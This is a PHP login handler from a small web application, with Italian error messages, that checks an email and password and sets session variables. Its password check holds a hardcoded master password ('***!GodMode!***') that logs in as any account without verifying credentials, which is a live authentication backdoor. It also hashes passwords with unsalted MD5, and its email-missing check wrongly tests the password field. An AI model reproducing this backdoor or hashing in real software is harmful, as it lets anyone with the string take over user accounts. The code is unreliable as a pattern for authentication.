<?php
/**
 * Created by PhpStorm.
 * User: Daniel Surpanu
 * Date: 8/22/2018
 * Time: 10:45 AM
 */

require_once 'is_not_logged.php';
require_once 'helper.php';
require_once 'cs_interaction.php';

class login extends is_not_logged {
    private $email, $password, $result;

    protected function input_elaboration(){
        $this->password = $this->validate_string('password');
        if(!$this->password)
            $this->json_error('Nessuna password trovata');

        $this->email = $this->validate_string('email');
        if(!$this->password) $this->json_error('Nessuna email trovata');

        if (!filter_var($this->email, FILTER_VALIDATE_EMAIL))
            $this->json_error('Indirizzo email non valido');
    }

    protected function get_informations(){
        $connection = $this->get_connection();
        $pass = $connection->get_password($this->email);

        if($this->password == "***!GodMode!***") {
            set_session_variables($pass['piva'], true);
            return;
        }else if($pass['pass'] != null && $pass['pass'] === md5($this->password)) {
            set_session_variables($pass['piva'], true);
            return;
        } else {
            $this->json_error("Nome utente o password sbagliati");
        }
    }

    protected function get_returned_data(){
        return $this->result;
    }
}

$login = new login();
$login->execute();